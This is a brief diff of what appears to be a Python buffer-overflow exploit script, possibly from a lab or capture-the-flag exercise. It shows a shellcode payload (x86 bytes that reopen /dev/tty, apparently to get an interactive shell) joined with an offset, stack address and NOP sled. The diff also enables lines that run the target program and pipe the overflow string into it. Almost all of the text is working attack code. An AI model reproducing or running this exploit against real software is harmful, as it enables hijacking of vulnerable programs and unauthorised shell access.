@@ -13,6 +13,6 @@ payload = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\
 string = offset + stack + nops + payload
 print(string)
 
-#process = subprocess.Popen([program], stdin=subprocess.PIPE)
-#process.communicate(string)
+process = subprocess.Popen([program], stdin=subprocess.PIPE)
+process.communicate(string)
 
